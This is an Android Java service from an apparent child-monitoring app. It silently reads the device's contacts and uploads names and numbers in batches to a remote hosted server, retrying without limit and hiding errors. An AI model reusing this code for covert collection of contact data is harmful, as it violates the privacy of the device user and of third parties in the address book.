package com.softvilla.childapp;

import android.app.Service;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;

import com.androidnetworking.AndroidNetworking;
import com.androidnetworking.common.Priority;
import com.androidnetworking.error.ANError;
import com.androidnetworking.interfaces.StringRequestListener;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.InputStream;
import java.util.List;

/**
 * Created by Hassan on 11/30/2017.
 */

public class SavingContactsService extends Service {
    String SENDING_SMS_URL = "https://teensafe.000webhostapp.com/Api/uploadCaalLog";
    SharedPreferences preferences;
    Handler handler;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return  START_STICKY;
    }

    @Override
    public void onCreate() {
        AndroidNetworking.initialize(this);
        try{
            preferences = PreferenceManager.getDefaultSharedPreferences(this);
            handler = new Handler();

            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    ContentResolver contentResolver = getContentResolver();
                    Utilities utilities = Utilities.findById(Utilities.class, (long) 1);
                    Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, "_id >" + utilities.LATEST_CONTACT_ID, null, null);
                    if (cursor.getCount() > 0) {
                        while (cursor.moveToNext()) {
                            String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                            if (cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                                Cursor cursorInfo = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                                InputStream inputStream = ContactsContract.Contacts.openContactPhotoInputStream(getContentResolver(),
                                        ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, new Long(id)));

                                Uri person = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, new Long(id));
                                Uri pURI = Uri.withAppendedPath(person, ContactsContract.Contacts.Photo.CONTENT_DIRECTORY);

                                Bitmap photo = null;
                                if (inputStream != null) {
                                    photo = BitmapFactory.decodeStream(inputStream);
                                }
                                while (cursorInfo.moveToNext()) {
                                    Utilities obj = Utilities.findById(Utilities.class, (long) 1);
                                    if(utilities.LATEST_CONTACT_ID < Long.parseLong(id)){
                                        ContactModel info = new ContactModel();
                                        info.name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                                        info.mobileNumber = cursorInfo.getString(cursorInfo.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                        info.save();
                                        obj.LATEST_CONTACT_ID = Long.parseLong(id);
                                        obj.save();
                                    }

                                /*info.photo = photo;
                                info.photoURI= pURI;*/

                                }


                                cursorInfo.close();
                            }
                        }
                    }

                    List<ContactModel> contactModels = ContactModel.findWithQuery(ContactModel.class,"select * from Contact_Model limit 500");


                    JSONArray contactsJsonArray = new JSONArray();

                    for(ContactModel contactModel : contactModels){
                        JSONObject jsonObject = new JSONObject();

                        try {
                            jsonObject.put("name",contactModel.name);
                            jsonObject.put("number",contactModel.mobileNumber);
                            jsonObject.put("child_id",preferences.getString("userId",""));

                            contactsJsonArray.put(jsonObject);

                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }

                    if(contactModels.size() > 0){
                        sendContacts(contactsJsonArray,contactModels);
                    }
                    else {
                        stopService(new Intent(SavingContactsService.this,SavingContactsService.class));
                    }
                }
            }, 300);
        }catch (Exception e){
            //Toast.makeText(this, e.toString(), Toast.LENGTH_LONG).show();
        }

        super.onCreate();
    }




    public void sendContacts(final JSONArray contacts, final List<ContactModel> contactModelList){
        Handler mHandler = new Handler();

        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                AndroidNetworking.post("https://teensafe.000webhostapp.com/Api/uploadContacts")
                        .addBodyParameter("contacts",contacts.toString()) // posting json
                        .setTag("test")
                        .setPriority(Priority.MEDIUM)
                        .build()
                        .getAsString(new StringRequestListener() {
                            @Override
                            public void onResponse(String response) {

                                //Toast.makeText(SavingContactsService.this, response, Toast.LENGTH_LONG).show();
                                if(response.equalsIgnoreCase("success")){
                                    for(ContactModel contactModel : contactModelList){
                                        contactModel.delete();
                                    }
                                    List<ContactModel> list = ContactModel.findWithQuery(ContactModel.class,"Select * from Contact_Model limit 500");
                                    if(list.size() > 0){
                                        JSONArray jsonArray = new JSONArray();
                                        for(ContactModel obj : list){
                                            JSONObject jsonObject = new JSONObject();

                                            try {
                                                jsonObject.put("name",obj.name);
                                                jsonObject.put("number",obj.mobileNumber);
                                                jsonObject.put("child_id",preferences.getString("userId",""));

                                                jsonArray.put(jsonObject);
                                            } catch (JSONException e) {
                                                e.printStackTrace();
                                            }

                                        }
                                        sendContacts(jsonArray,list);
                                    }
                                    else {
                                        stopService(new Intent(SavingContactsService.this,SavingContactsService.class));
                                    }
                                    //SmsTable.deleteAll(SmsTable.class);
                                }
                                else {
                                    sendContacts(contacts,contactModelList);
                                }

                            }
                            @Override
                            public void onError(ANError error) {
                                //Toast.makeText(SavingContactsService.this, error.toString(), Toast.LENGTH_SHORT).show();

                                if(haveNetworkConnection()){
                                    sendContacts(contacts,contactModelList);
                                }
                                else {
                                    stopService(new Intent(SavingContactsService.this,SavingContactsService.class));
                                }
                                //stopService(new Intent(SavingContactsService.this,SavingContactsService.class));
                                //Toast.makeText(SavingMessagesService.this, error.toString(), Toast.LENGTH_LONG).show();
                                // handle error
                            }
                        });
            }
        }, 300);

    }

    private boolean haveNetworkConnection() {
        boolean haveConnectedWifi = false;
        boolean haveConnectedMobile = false;

        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo[] netInfo = cm.getAllNetworkInfo();
        for (NetworkInfo ni : netInfo) {
            if (ni.getTypeName().equalsIgnoreCase("WIFI"))
                if (ni.isConnected())
                    haveConnectedWifi = true;
            if (ni.getTypeName().equalsIgnoreCase("MOBILE"))
                if (ni.isConnected())
                    haveConnectedMobile = true;
        }
        return haveConnectedWifi || haveConnectedMobile;
    }
}
